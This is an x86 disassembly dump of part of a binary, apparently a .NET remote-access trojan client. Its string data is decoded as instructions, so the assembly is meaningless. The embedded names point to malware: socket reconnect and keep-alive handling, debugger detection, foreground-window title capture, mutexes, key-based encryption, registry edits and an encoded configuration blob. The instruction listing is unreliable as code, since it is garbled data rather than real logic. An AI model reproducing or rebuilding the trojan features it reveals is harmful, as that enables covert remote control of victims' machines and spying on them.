  40916f:	6e                   	outsb  %ds:(%esi),(%dx)
  409170:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409175:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409179:	6e                   	outsb  %ds:(%esi),(%dx)
  40917a:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40917f:	65 74 00             	gs je  0x409182
  409182:	53                   	push   %ebx
  409183:	79 73                	jns    0x4091f8
  409185:	74 65                	je     0x4091ec
  409187:	6d                   	insl   (%dx),%es:(%edi)
  409188:	2e 4e                	cs dec %esi
  40918a:	65 74 00             	gs je  0x40918d
  40918d:	53                   	push   %ebx
  40918e:	65 74 00             	gs je  0x409191
  409191:	54                   	push   %esp
  409192:	61                   	popa
  409193:	72 67                	jb     0x4091fc
  409195:	65 74 00             	gs je  0x409198
  409198:	43                   	inc    %ebx
  409199:	6c                   	insb   (%dx),%es:(%edi)
  40919a:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  4091a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a2:	64 6c                	fs insb (%dx),%es:(%edi)
  4091a4:	65 5f                	gs pop %edi
  4091a6:	50                   	push   %eax
  4091a7:	61                   	popa
  4091a8:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091ab:	74 00                	je     0x4091ad
  4091ad:	4b                   	dec    %ebx
  4091ae:	65 65 70 41          	gs gs jo 0x4091f3
  4091b2:	6c                   	insb   (%dx),%es:(%edi)
  4091b3:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091ba:	65 74 00             	gs je  0x4091bd
  4091bd:	43                   	inc    %ebx
  4091be:	6c                   	insb   (%dx),%es:(%edi)
  4091bf:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091c6:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091ca:	53                   	push   %ebx
  4091cb:	79 73                	jns    0x409240
  4091cd:	74 65                	je     0x409234
  4091cf:	6d                   	insl   (%dx),%es:(%edi)
  4091d0:	2e 43                	cs inc %ebx
  4091d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d3:	6c                   	insb   (%dx),%es:(%edi)
  4091d4:	6c                   	insb   (%dx),%es:(%edi)
  4091d5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091da:	6e                   	outsb  %ds:(%esi),(%dx)
  4091db:	73 2e                	jae    0x40920b
  4091dd:	49                   	dec    %ecx
  4091de:	45                   	inc    %ebp
  4091df:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e0:	75 6d                	jne    0x40924f
  4091e2:	65 72 61             	gs jb  0x409246
  4091e5:	74 6f                	je     0x409256
  4091e7:	72 2e                	jb     0x409217
  4091e9:	52                   	push   %edx
  4091ea:	65 73 65             	gs jae 0x409252
  4091ed:	74 00                	je     0x4091ef
  4091ef:	67 65 74 5f          	addr16 gs je 0x409252
  4091f3:	4f                   	dec    %edi
  4091f4:	66 66 73 65          	data16 data16 jae 0x40925d
  4091f8:	74 00                	je     0x4091fa
  4091fa:	73 65                	jae    0x409261
  4091fc:	74 5f                	je     0x40925d
  4091fe:	4f                   	dec    %edi
  4091ff:	66 66 73 65          	data16 data16 jae 0x409268
  409203:	74 00                	je     0x409205
  409205:	53                   	push   %ebx
  409206:	70 6c                	jo     0x409274
  409208:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  40920f:	6e 
  409210:	74 4f                	je     0x409261
  409212:	6e                   	outsb  %ds:(%esi),(%dx)
  409213:	45                   	inc    %ebp
  409214:	78 69                	js     0x40927f
  409216:	74 00                	je     0x409218
  409218:	53                   	push   %ebx
  409219:	61                   	popa
  40921a:	6c                   	insb   (%dx),%es:(%edi)
  40921b:	74 00                	je     0x40921d
  40921d:	49                   	dec    %ecx
  40921e:	41                   	inc    %ecx
  40921f:	73 79                	jae    0x40929a
  409221:	6e                   	outsb  %ds:(%esi),(%dx)
  409222:	63 52 65             	arpl   %edx,0x65(%edx)
  409225:	73 75                	jae    0x40929c
  409227:	6c                   	insb   (%dx),%es:(%edi)
  409228:	74 00                	je     0x40922a
  40922a:	54                   	push   %esp
  40922b:	6f                   	outsl  %ds:(%esi),(%dx)
  40922c:	55                   	push   %ebp
  40922d:	70 70                	jo     0x40929f
  40922f:	65 72 49             	gs jb  0x40927b
  409232:	6e                   	outsb  %ds:(%esi),(%dx)
  409233:	76 61                	jbe    0x409296
  409235:	72 69                	jb     0x4092a0
  409237:	61                   	popa
  409238:	6e                   	outsb  %ds:(%esi),(%dx)
  409239:	74 00                	je     0x40923b
  40923b:	57                   	push   %edi
  40923c:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409240:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409247:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40924e:	65 
  40924f:	43                   	inc    %ebx
  409250:	6c                   	insb   (%dx),%es:(%edi)
  409251:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409258:	74 5f                	je     0x4092b9
  40925a:	53                   	push   %ebx
  40925b:	73 6c                	jae    0x4092c9
  40925d:	43                   	inc    %ebx
  40925e:	6c                   	insb   (%dx),%es:(%edi)
  40925f:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409266:	74 5f                	je     0x4092c7
  409268:	53                   	push   %ebx
  409269:	73 6c                	jae    0x4092d7
  40926b:	43                   	inc    %ebx
  40926c:	6c                   	insb   (%dx),%es:(%edi)
  40926d:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409274:	74 5f                	je     0x4092d5
  409276:	54                   	push   %esp
  409277:	63 70 43             	arpl   %esi,0x43(%eax)
  40927a:	6c                   	insb   (%dx),%es:(%edi)
  40927b:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409282:	74 5f                	je     0x4092e3
  409284:	54                   	push   %esp
  409285:	63 70 43             	arpl   %esi,0x43(%eax)
  409288:	6c                   	insb   (%dx),%es:(%edi)
  409289:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409290:	74 68                	je     0x4092fa
  409292:	65 6e                	outsb  %gs:(%esi),(%dx)
  409294:	74 69                	je     0x4092ff
  409296:	63 61 74             	arpl   %esp,0x74(%ecx)
  409299:	65 41                	gs inc %ecx
  40929b:	73 43                	jae    0x4092e0
  40929d:	6c                   	insb   (%dx),%es:(%edi)
  40929e:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a5:	73 74                	jae    0x40931b
  4092a7:	65 6d                	gs insl (%dx),%es:(%edi)
  4092a9:	2e 4d                	cs dec %ebp
  4092ab:	61                   	popa
  4092ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ad:	61                   	popa
  4092ae:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b3:	74 00                	je     0x4092b5
  4092b5:	45                   	inc    %ebp
  4092b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b7:	76 69                	jbe    0x409322
  4092b9:	72 6f                	jb     0x40932a
  4092bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bc:	6d                   	insl   (%dx),%es:(%edi)
  4092bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092bf:	74 00                	je     0x4092c1
  4092c1:	70 61                	jo     0x409324
  4092c3:	72 65                	jb     0x40932a
  4092c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c6:	74 00                	je     0x4092c8
  4092c8:	53                   	push   %ebx
  4092c9:	79 73                	jns    0x40933e
  4092cb:	74 65                	je     0x409332
  4092cd:	6d                   	insl   (%dx),%es:(%edi)
  4092ce:	2e 43                	cs inc %ebx
  4092d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d1:	6c                   	insb   (%dx),%es:(%edi)
  4092d2:	6c                   	insb   (%dx),%es:(%edi)
  4092d3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d9:	73 2e                	jae    0x409309
  4092db:	49                   	dec    %ecx
  4092dc:	45                   	inc    %ebp
  4092dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092de:	75 6d                	jne    0x40934d
  4092e0:	65 72 61             	gs jb  0x409344
  4092e3:	74 6f                	je     0x409354
  4092e5:	72 2e                	jb     0x409315
  4092e7:	43                   	inc    %ebx
  4092e8:	75 72                	jne    0x40935c
  4092ea:	72 65                	jb     0x409351
  4092ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ed:	74 00                	je     0x4092ef
  4092ef:	53                   	push   %ebx
  4092f0:	79 73                	jns    0x409365
  4092f2:	74 65                	je     0x409359
  4092f4:	6d                   	insl   (%dx),%es:(%edi)
  4092f5:	2e 43                	cs inc %ebx
  4092f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f8:	6c                   	insb   (%dx),%es:(%edi)
  4092f9:	6c                   	insb   (%dx),%es:(%edi)
  4092fa:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092ff:	6e                   	outsb  %ds:(%esi),(%dx)
  409300:	73 2e                	jae    0x409330
  409302:	49                   	dec    %ecx
  409303:	45                   	inc    %ebp
  409304:	6e                   	outsb  %ds:(%esi),(%dx)
  409305:	75 6d                	jne    0x409374
  409307:	65 72 61             	gs jb  0x40936b
  40930a:	74 6f                	je     0x40937b
  40930c:	72 2e                	jb     0x40933c
  40930e:	67 65 74 5f          	addr16 gs je 0x409371
  409312:	43                   	inc    %ebx
  409313:	75 72                	jne    0x409387
  409315:	72 65                	jb     0x40937c
  409317:	6e                   	outsb  %ds:(%esi),(%dx)
  409318:	74 00                	je     0x40931a
  40931a:	47                   	inc    %edi
  40931b:	65 74 43             	gs je  0x409361
  40931e:	75 72                	jne    0x409392
  409320:	72 65                	jb     0x409387
  409322:	6e                   	outsb  %ds:(%esi),(%dx)
  409323:	74 00                	je     0x409325
  409325:	43                   	inc    %ebx
  409326:	68 65 63 6b 52       	push   $0x526b6365
  40932b:	65 6d                	gs insl (%dx),%es:(%edi)
  40932d:	6f                   	outsl  %ds:(%esi),(%dx)
  40932e:	74 65                	je     0x409395
  409330:	44                   	inc    %esp
  409331:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409335:	67 65 72 50          	addr16 gs jb 0x409389
  409339:	72 65                	jb     0x4093a0
  40933b:	73 65                	jae    0x4093a2
  40933d:	6e                   	outsb  %ds:(%esi),(%dx)
  40933e:	74 00                	je     0x409340
  409340:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409347:	67 65 72 50          	addr16 gs jb 0x40939b
  40934b:	72 65                	jb     0x4093b2
  40934d:	73 65                	jae    0x4093b4
  40934f:	6e                   	outsb  %ds:(%esi),(%dx)
  409350:	74 00                	je     0x409352
  409352:	67 65 74 5f          	addr16 gs je 0x4093b5
  409356:	52                   	push   %edx
  409357:	65 6d                	gs insl (%dx),%es:(%edi)
  409359:	6f                   	outsl  %ds:(%esi),(%dx)
  40935a:	74 65                	je     0x4093c1
  40935c:	45                   	inc    %ebp
  40935d:	6e                   	outsb  %ds:(%esi),(%dx)
  40935e:	64 50                	fs push %eax
  409360:	6f                   	outsl  %ds:(%esi),(%dx)
  409361:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409368:	5f                   	pop    %edi
  409369:	43                   	inc    %ebx
  40936a:	6f                   	outsl  %ds:(%esi),(%dx)
  40936b:	75 6e                	jne    0x4093db
  40936d:	74 00                	je     0x40936f
  40936f:	67 65 74 5f          	addr16 gs je 0x4093d2
  409373:	50                   	push   %eax
  409374:	72 6f                	jb     0x4093e5
  409376:	63 65 73             	arpl   %esp,0x73(%ebp)
  409379:	73 6f                	jae    0x4093ea
  40937b:	72 43                	jb     0x4093c0
  40937d:	6f                   	outsl  %ds:(%esi),(%dx)
  40937e:	75 6e                	jne    0x4093ee
  409380:	74 00                	je     0x409382
  409382:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409385:	6e                   	outsb  %ds:(%esi),(%dx)
  409386:	74 00                	je     0x409388
  409388:	47                   	inc    %edi
  409389:	65 74 50             	gs je  0x4093dc
  40938c:	61                   	popa
  40938d:	74 68                	je     0x4093f7
  40938f:	52                   	push   %edx
  409390:	6f                   	outsl  %ds:(%esi),(%dx)
  409391:	6f                   	outsl  %ds:(%esi),(%dx)
  409392:	74 00                	je     0x409394
  409394:	44                   	inc    %esp
  409395:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409399:	70 74                	jo     0x40940f
  40939b:	00 45 6e             	add    %al,0x6e(%ebp)
  40939e:	63 72 79             	arpl   %esi,0x79(%edx)
  4093a1:	70 74                	jo     0x409417
  4093a3:	00 50 61             	add    %dl,0x61(%eax)
  4093a6:	72 61                	jb     0x409409
  4093a8:	6d                   	insl   (%dx),%es:(%edi)
  4093a9:	65 74 65             	gs je  0x409411
  4093ac:	72 69                	jb     0x409417
  4093ae:	7a 65                	jp     0x409415
  4093b0:	64 54                	fs push %esp
  4093b2:	68 72 65 61 64       	push   $0x64616572
  4093b7:	53                   	push   %ebx
  4093b8:	74 61                	je     0x40941b
  4093ba:	72 74                	jb     0x409430
  4093bc:	00 43 6f             	add    %al,0x6f(%ebx)
  4093bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c0:	76 65                	jbe    0x409427
  4093c2:	72 74                	jb     0x409438
  4093c4:	00 46 61             	add    %al,0x61(%esi)
  4093c7:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093ce:	54 
  4093cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d0:	4c                   	dec    %esp
  4093d1:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093d8:	75 74                	jne    0x40944e
  4093da:	00 53 79             	add    %dl,0x79(%ebx)
  4093dd:	73 74                	jae    0x409453
  4093df:	65 6d                	gs insl (%dx),%es:(%edi)
  4093e1:	2e 43                	cs inc %ebx
  4093e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e4:	6c                   	insb   (%dx),%es:(%edi)
  4093e5:	6c                   	insb   (%dx),%es:(%edi)
  4093e6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ec:	73 2e                	jae    0x40941c
  4093ee:	49                   	dec    %ecx
  4093ef:	45                   	inc    %ebp
  4093f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f1:	75 6d                	jne    0x409460
  4093f3:	65 72 61             	gs jb  0x409457
  4093f6:	74 6f                	je     0x409467
  4093f8:	72 2e                	jb     0x409428
  4093fa:	4d                   	dec    %ebp
  4093fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fc:	76 65                	jbe    0x409463
  4093fe:	4e                   	dec    %esi
  4093ff:	65 78 74             	gs js  0x409476
  409402:	00 53 79             	add    %dl,0x79(%ebx)
  409405:	73 74                	jae    0x40947b
  409407:	65 6d                	gs insl (%dx),%es:(%edi)
  409409:	2e 54                	cs push %esp
  40940b:	65 78 74             	gs js  0x409482
  40940e:	00 47 65             	add    %al,0x65(%edi)
  409411:	74 57                	je     0x40946a
  409413:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40941a:	78 74                	js     0x409490
  40941c:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409420:	74 00                	je     0x409422
  409422:	76 00                	jbe    0x409424
  409424:	47                   	inc    %edi
  409425:	65 74 46             	gs je  0x40946e
  409428:	6f                   	outsl  %ds:(%esi),(%dx)
  409429:	72 65                	jb     0x409490
  40942b:	67 72 6f             	addr16 jb 0x40949d
  40942e:	75 6e                	jne    0x40949e
  409430:	64 57                	fs push %edi
  409432:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409439:	65 74 5f             	gs je  0x40949b
  40943c:	43                   	inc    %ebx
  40943d:	72 65                	jb     0x4094a4
  40943f:	61                   	popa
  409440:	74 65                	je     0x4094a7
  409442:	4e                   	dec    %esi
  409443:	6f                   	outsl  %ds:(%esi),(%dx)
  409444:	57                   	push   %edi
  409445:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  40944c:	6e                   	outsb  %ds:(%esi),(%dx)
  40944d:	64 65 78 00          	fs gs js 0x409451
  409451:	43                   	inc    %ebx
  409452:	6c                   	insb   (%dx),%es:(%edi)
  409453:	6f                   	outsl  %ds:(%esi),(%dx)
  409454:	73 65                	jae    0x4094bb
  409456:	4d                   	dec    %ebp
  409457:	75 74                	jne    0x4094cd
  409459:	65 78 00             	gs js  0x40945c
  40945c:	43                   	inc    %ebx
  40945d:	72 65                	jb     0x4094c4
  40945f:	61                   	popa
  409460:	74 65                	je     0x4094c7
  409462:	4d                   	dec    %ebp
  409463:	75 74                	jne    0x4094d9
  409465:	65 78 00             	gs js  0x409468
  409468:	44                   	inc    %esp
  409469:	65 6c                	gs insb (%dx),%es:(%edi)
  40946b:	61                   	popa
  40946c:	79 00                	jns    0x40946e
  40946e:	57                   	push   %edi
  40946f:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409476:	61                   	popa
  409477:	79 00                	jns    0x409479
  409479:	49                   	dec    %ecx
  40947a:	6e                   	outsb  %ds:(%esi),(%dx)
  40947b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409482:	65 
  409483:	41                   	inc    %ecx
  409484:	72 72                	jb     0x4094f8
  409486:	61                   	popa
  409487:	79 00                	jns    0x409489
  409489:	4d                   	dec    %ebp
  40948a:	73 67                	jae    0x4094f3
  40948c:	50                   	push   %eax
  40948d:	61                   	popa
  40948e:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409491:	72 72                	jb     0x409505
  409493:	61                   	popa
  409494:	79 00                	jns    0x409496
  409496:	54                   	push   %esp
  409497:	6f                   	outsl  %ds:(%esi),(%dx)
  409498:	41                   	inc    %ecx
  409499:	72 72                	jb     0x40950d
  40949b:	61                   	popa
  40949c:	79 00                	jns    0x40949e
  40949e:	67 65 74 5f          	addr16 gs je 0x409501
  4094a2:	41                   	inc    %ecx
  4094a3:	73 41                	jae    0x4094e6
  4094a5:	72 72                	jb     0x409519
  4094a7:	61                   	popa
  4094a8:	79 00                	jns    0x4094aa
  4094aa:	72 65                	jb     0x409511
  4094ac:	66 41                	inc    %cx
  4094ae:	73 41                	jae    0x4094f1
  4094b0:	72 72                	jb     0x409524
  4094b2:	61                   	popa
  4094b3:	79 00                	jns    0x4094b5
  4094b5:	67 65 74 5f          	addr16 gs je 0x409518
  4094b9:	4b                   	dec    %ebx
  4094ba:	65 79 00             	gs jns 0x4094bd
  4094bd:	73 65                	jae    0x409524
  4094bf:	74 5f                	je     0x409520
  4094c1:	4b                   	dec    %ebx
  4094c2:	65 79 00             	gs jns 0x4094c5
  4094c5:	43                   	inc    %ebx
  4094c6:	72 65                	jb     0x40952d
  4094c8:	61                   	popa
  4094c9:	74 65                	je     0x409530
  4094cb:	53                   	push   %ebx
  4094cc:	75 62                	jne    0x409530
  4094ce:	4b                   	dec    %ebx
  4094cf:	65 79 00             	gs jns 0x4094d2
  4094d2:	44                   	inc    %esp
  4094d3:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d5:	65 74 65             	gs je  0x40953d
  4094d8:	53                   	push   %ebx
  4094d9:	75 62                	jne    0x40953d
  4094db:	4b                   	dec    %ebx
  4094dc:	65 79 00             	gs jns 0x4094df
  4094df:	4f                   	dec    %edi
  4094e0:	70 65                	jo     0x409547
  4094e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e3:	53                   	push   %ebx
  4094e4:	75 62                	jne    0x409548
  4094e6:	4b                   	dec    %ebx
  4094e7:	65 79 00             	gs jns 0x4094ea
  4094ea:	67 65 74 5f          	addr16 gs je 0x40954d
  4094ee:	50                   	push   %eax
  4094ef:	75 62                	jne    0x409553
  4094f1:	6c                   	insb   (%dx),%es:(%edi)
  4094f2:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f9:	61                   	popa
  4094fa:	75 74                	jne    0x409570
  4094fc:	68 4b 65 79 00       	push   $0x79654b
  409501:	6d                   	insl   (%dx),%es:(%edi)
  409502:	61                   	popa
  409503:	73 74                	jae    0x409579
  409505:	65 72 4b             	gs jb  0x409553
  409508:	65 79 00             	gs jns 0x40950b
  40950b:	52                   	push   %edx
  40950c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409513:	4b 65 
  409515:	79 00                	jns    0x409517
  409517:	5f                   	pop    %edi
  409518:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40951c:	53                   	push   %ebx
  40951d:	79 73                	jns    0x409592
  40951f:	74 65                	je     0x409586
  409521:	6d                   	insl   (%dx),%es:(%edi)
  409522:	2e 53                	cs push %ebx
  409524:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409528:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40952f:	70 
  409530:	74 6f                	je     0x4095a1
  409532:	67 72 61             	addr16 jb 0x409596
  409535:	70 68                	jo     0x40959f
  409537:	79 00                	jns    0x409539
  409539:	41                   	inc    %ecx
  40953a:	73 73                	jae    0x4095af
  40953c:	65 6d                	gs insl (%dx),%es:(%edi)
  40953e:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409542:	41                   	inc    %ecx
  409543:	64 64 72 65          	fs fs jb 0x4095ac
  409547:	73 73                	jae    0x4095bc
  409549:	46                   	inc    %esi
  40954a:	61                   	popa
  40954b:	6d                   	insl   (%dx),%es:(%edi)
  40954c:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409553:	63 
  409554:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409558:	79 00                	jns    0x40955a
  40955a:	57                   	push   %edi
  40955b:	72 69                	jb     0x4095c6
  40955d:	74 65                	je     0x4095c4
  40955f:	42                   	inc    %edx
  409560:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409567:	6f                   	outsl  %ds:(%esi),(%dx)
  409568:	42                   	inc    %edx
  409569:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409570:	65 74 5f             	gs je  0x4095d2
  409573:	53                   	push   %ebx
  409574:	79 73                	jns    0x4095e9
  409576:	74 65                	je     0x4095dd
  409578:	6d                   	insl   (%dx),%es:(%edi)
  409579:	44                   	inc    %esp
  40957a:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409581:	79 00                	jns    0x409583
  409583:	53                   	push   %ebx
  409584:	65 74 52             	gs je  0x4095d9
  409587:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40958e:	00 6f 
  409590:	70 5f                	jo     0x4095f1
  409592:	45                   	inc    %ebp
  409593:	71 75                	jno    0x40960a
  409595:	61                   	popa
  409596:	6c                   	insb   (%dx),%es:(%edi)
  409597:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40959e:	49 
  40959f:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a0:	65 71 75             	gs jno 0x409618
  4095a3:	61                   	popa
  4095a4:	6c                   	insb   (%dx),%es:(%edi)
  4095a5:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095ac:	74 
  4095ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4095af:	2e 4e                	cs dec %esi
  4095b1:	65 74 2e             	gs je  0x4095e2
  4095b4:	53                   	push   %ebx
  4095b5:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b9:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095c0:	64 
  4095c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c2:	77 73                	ja     0x409637
  4095c4:	49                   	dec    %ecx
  4095c5:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c8:	74 69                	je     0x409633
  4095ca:	74 79                	je     0x409645
  4095cc:	00 49 73             	add    %cl,0x73(%ecx)
  4095cf:	4e                   	dec    %esi
  4095d0:	75 6c                	jne    0x40963e
  4095d2:	6c                   	insb   (%dx),%es:(%edi)
  4095d3:	4f                   	dec    %edi
  4095d4:	72 45                	jb     0x40961b
  4095d6:	6d                   	insl   (%dx),%es:(%edi)
  4095d7:	70 74                	jo     0x40964d
  4095d9:	79 00                	jns    0x4095db
  4095db:	00 00                	add    %al,(%eax)
  4095dd:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e2:	41                   	inc    %ecx
  4095e3:	00 32                	add    %dh,(%edx)
  4095e5:	00 35 00 36 00 00    	add    %dh,0x3600
  4095eb:	80 d9 65             	sbb    $0x65,%cl
  4095ee:	00 37                	add    %dh,(%edi)
  4095f0:	00 58 00             	add    %bl,0x0(%eax)
  4095f3:	69 00 61 00 4a 00    	imul   $0x4a0061,(%eax),%eax
  4095f9:	59                   	pop    %ecx
  4095fa:	00 6f 00             	add    %ch,0x0(%edi)
  4095fd:	32 00                	xor    (%eax),%al
  4095ff:	78 00                	js     0x409601
  409601:	59                   	pop    %ecx
  409602:	00 31                	add    %dh,(%ecx)
  409604:	00 6b 00             	add    %ch,0x0(%ebx)
  409607:	58                   	pop    %eax
  409608:	00 53 00             	add    %dl,0x0(%ebx)
  40960b:	39 00                	cmp    %eax,(%eax)
  40960d:	69 00 32 00 77 00    	imul   $0x770032,(%eax),%eax
  409613:	47                   	inc    %edi
  409614:	00 73 00             	add    %dh,0x0(%ebx)
  409617:	4e                   	dec    %esi
  409618:	00 7a 00             	add    %bh,0x0(%edx)
  40961b:	68 00 51 00 64       	push   $0x64005100
  409620:	00 75 00             	add    %dh,0x0(%ebp)
  409623:	5a                   	pop    %edx
  409624:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  409628:	00 37                	add    %dh,(%edi)
  40962a:	00 35 00 44 00 59    	add    %dh,0x59004400
  409630:	00 2f                	add    %ch,(%edi)
  409632:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  409636:	00 6b 00             	add    %ch,0x0(%ebx)
  409639:	48                   	dec    %eax
  40963a:	00 68 00             	add    %ch,0x0(%eax)
  40963d:	42                   	inc    %edx
  40963e:	00 62 00             	add    %ah,0x0(%edx)
  409641:	6f                   	outsl  %ds:(%esi),(%dx)
  409642:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  409646:	00 59 00             	add    %bl,0x0(%ecx)
  409649:	77 00                	ja     0x40964b
  40964b:	46                   	inc    %esi
  40964c:	00 61 00             	add    %ah,0x0(%ecx)
  40964f:	74 00                	je     0x409651
  409651:	6c                   	insb   (%dx),%es:(%edi)
  409652:	00 37                	add    %dh,(%edi)
  409654:	00 30                	add    %dh,(%eax)
  409656:	00 63 00             	add    %ah,0x0(%ebx)
  409659:	64 00 64 00 38       	add    %ah,%fs:0x38(%eax,%eax,1)
  40965e:	00 4e 00             	add    %cl,0x0(%esi)
  409661:	30 00                	xor    %al,(%eax)
  409663:	62 00                	bound  %eax,(%eax)
  409665:	65 00 36             	add    %dh,%gs:(%esi)
  409668:	00 30                	add    %dh,(%eax)
  40966a:	00 6a 00             	add    %ch,0x0(%edx)
  40966d:	6d                   	insl   (%dx),%es:(%edi)
  40966e:	00 36                	add    %dh,(%esi)
  409670:	00 46 00             	add    %al,0x0(%esi)
  409673:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  409677:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40967b:	6e                   	outsb  %ds:(%esi),(%dx)
  40967c:	00 55 00             	add    %dl,0x0(%ebp)
  40967f:	5a                   	pop    %edx
  409680:	00 68 00             	add    %ch,0x0(%eax)
  409683:	52                   	push   %edx
  409684:	00 79 00             	add    %bh,0x0(%ecx)
  409687:	76 00                	jbe    0x409689
  409689:	61                   	popa
  40968a:	00 50 00             	add    %dl,0x0(%eax)
  40968d:	37                   	aaa
  40968e:	00 35 00 6a 00 32    	add    %dh,0x32006a00
  409694:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  409698:	00 52 00             	add    %dl,0x0(%edx)
  40969b:	57                   	push   %edi
  40969c:	00 55 00             	add    %dl,0x0(%ebp)
  40969f:	72 00                	jb     0x4096a1
  4096a1:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  4096a5:	33 00                	xor    (%eax),%eax
  4096a7:	4c                   	dec    %esp
  4096a8:	00 45 00             	add    %al,0x0(%ebp)
  4096ab:	32 00                	xor    (%eax),%al
  4096ad:	34 00                	xor    $0x0,%al
  4096af:	6c                   	insb   (%dx),%es:(%edi)
  4096b0:	00 34 00             	add    %dh,(%eax,%eax,1)
  4096b3:	79 00                	jns    0x4096b5
  4096b5:	4a                   	dec    %edx
  4096b6:	00 57 00             	add    %dl,0x0(%edi)
  4096b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ba:	00 4b 00             	add    %cl,0x0(%ebx)
  4096bd:	45                   	inc    %ebp
